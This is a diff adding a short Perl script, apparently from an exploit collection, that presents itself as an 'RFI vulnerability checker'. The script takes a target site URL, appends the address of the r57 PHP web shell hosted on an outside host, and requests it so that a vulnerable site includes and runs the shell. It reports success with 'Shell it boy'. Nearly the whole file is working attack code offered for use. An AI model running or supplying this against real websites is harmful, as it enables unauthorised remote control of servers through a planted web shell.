@@ -1,0 +1,40 @@
+#!/usr/bin/perl
+
+use LWP::UserAgent;
+use HTTP::Request;
+
+
+print q(
+
+   +++++++++++++++++++++++++++++++++++++++++++++++++
+   -                  -                            -
+   -                  -                            -
+   -   Simple RFI vulnerability checker            -
+   -              by D4T4X                         -
+   -                  -                            -
+   -      Visit ljuska.org | madspot.org       	   -
+   -         Thanks stefo for help                 -
+   +++++++++++++++++++++++++++++++++++++++++++++++++
+
+);
+print "Your site:\n";
+$url= <STDIN>;
+chomp($url);
+
+$my_shell='http://www.privc0de.com/r57.txt';
+
+
+my $site = $url.$my_shell;
+my $w = HTTP::Request->new(GET=>$site);
+my $ua = LWP::UserAgent->new();
+my $an = $ua->request($w);
+
+if($an->content =~ r57shell) {
+print "w00t! w00t!-Shell it boy :P\n";
+print "Adress: $site";
+}
+
+
+else{
+print "Sorry no!";
+}
